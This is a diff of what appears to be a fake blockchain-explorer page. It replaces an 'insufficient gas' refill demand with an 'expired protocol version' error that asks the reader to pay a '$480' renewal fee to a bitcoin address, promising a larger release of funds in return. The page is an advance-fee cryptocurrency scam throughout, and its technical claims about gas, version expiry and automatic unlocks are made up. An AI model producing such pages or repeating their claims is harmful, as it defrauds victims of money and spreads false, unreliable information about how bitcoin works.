@@ -9,105 +9,36 @@
 
 Hash ID:    **8b214f6839d869d6ab80[39Kn3XYPUmrud...qHwnUYg6uvz]**
 
-     
-| Address:                  | 39Kn3XYPUmrud...qHwnUYg6uvz|
-|---------------------------|---------------------------|
-| weight/size:              | 892,311                   |
-| Relesed date:             | 2 May/25                  |
-| Version:                  | 585244672                 |
-| IP Relayed By:            | 162.220.166.93:8333       |
-| Witness tx count:         | 1,175                     |
-| Inputs count:             | 3,359                     |
-| outputs count:            | 3,714                     |
-| From:                     | BLOCKCHAIN                |
-| To:                       | 39Kn3XYPUmrud...qHwnUYg6uvz|
-| <span style="color: Red;">Insufcient Gas:</span> | <span style="color: Red;">0.00976176 BTC [$940 usd]</span> |
 
+ **Error Code:** `BTC_ERR_VER_EXP_001`  
+<br/>
 
-<img src="IMG_9146.jpeg" alt="ethscan Logo" width="700" />
+Transaction failed due to expired protocol version. Source: BLOCKCHAIN Sender Address: 39Kn3XYPUmrudUgjf8baEkvqHwnUYg6uvz Version: 585244672 (Expired) IP Relayed By: 162.220.166.93:8333 Inputs: 3,359 | Outputs: 3,714 Error Source: Version expired / Out of time. Blockchain payment re-registration required for new version.
 
+**Resolution:**  
+Instant Release (₦60,000) available upon successful version renewal.  
+Auto-process will initiate if re-registration is completed.
 
-<style>
-  .responsive-table {
-    width: 100%;
-    border-collapse: collapse;
-  }
-  .responsive-table th, .responsive-table td {
-    padding: 5px; /* Reduce padding */
-    text-align: left;
-    font-size: 14px; /* Adjust font size */
-  }
-  @media (max-width: 600px) {
-    .responsive-table th, .responsive-table td {
-      display: block; /* Stack elements on small screens */
-      width: 100%;
-    }
-  }
-</style>
+---
 
-<table class="responsive-table">
-  <tr>
-    <td style="color: Red;"><strong>⛽️ Gas Refill:</strong></td>
-    <td style="color: Red;"><strong>0.00976176 BTC [$940 USD]</strong></td>
-  </tr>
-  <tr>
-    <td style="color: Blue;"><strong>Gas Received</strong> <s>$301 PAID</s></td>
-    <td style="color: Red;"><s>$639</s> CURRENTLY OUTSTANDING ⏳</td>
-  </tr>
-  <tr>
-    <td><strong>Pay ID:</strong></td>
-    <td>bc1q08mp7f3wdvpav0fkjy8reun6wtzulrc999jsls</td>  <img src="IMG_8518.jpeg" alt="blockchain Logo" width="30" />
-  </tr>
-</table> 
+### **[Instant Version Registration](#complete-renewal-payment)**
 
+---
 
-<form action="https://phantom.com/" method="get">
-<button type="submit"> ⚙️ Complete Gas Refill </button>
+## Complete Renewal Payment
 
-<br>
-<br>
-<br>
+<br/><br/><br/><br/>
 
+<img src="IMG_8745.jpeg" alt="blockchain Logo" width="90" />
 
-<span style="color: Yellow;"> ~~Warning! Error encountered during contract execution [Out of gas]~~ ⚠️ </span>
+<br/><br/><br/><br/>
 
+| Payment ID                | Details                                         |
+|---------------------------|-------------------------------------------------|
+| **Payment Address**       | `bc1qch3a9alqc9vnu0qpw0nrnzvg7snr93x0gwyh0y`    |
+| **Version Renewal Fee**   | `$480`                                          |
 
-<br>
-<br>
-<br>
-
-
-<img src="IMG_9150.jpeg" alt="ethscan Logo" width="700" />
-
-
-<br>
-<br>
-<br>
-
-
-    ⛽️ Alert Error: VM Exception while processing transaction out of gas
-
-
-
-<br>
-<br>
-<br>
-
-
-
-<span style="color: Red;"> **SUMMARY** The <u>"out of gas"</u> error occurs when all the gas you allotted for the transaction is consumed before the transaction could complete </span>
-
-
-
-<br>
-<br>
-<br>
-
-
-
-<form action="https://www.blockchain.com/explorer" method="get">
-<button type="submit"> Accept incoming BTC [$60,000] </button>
- 
+> **Note:** All transactions must be confirmed before automatic version unlock.
 
 
 <img src="IMG_9086.gif" alt="loading gif display" width="700">
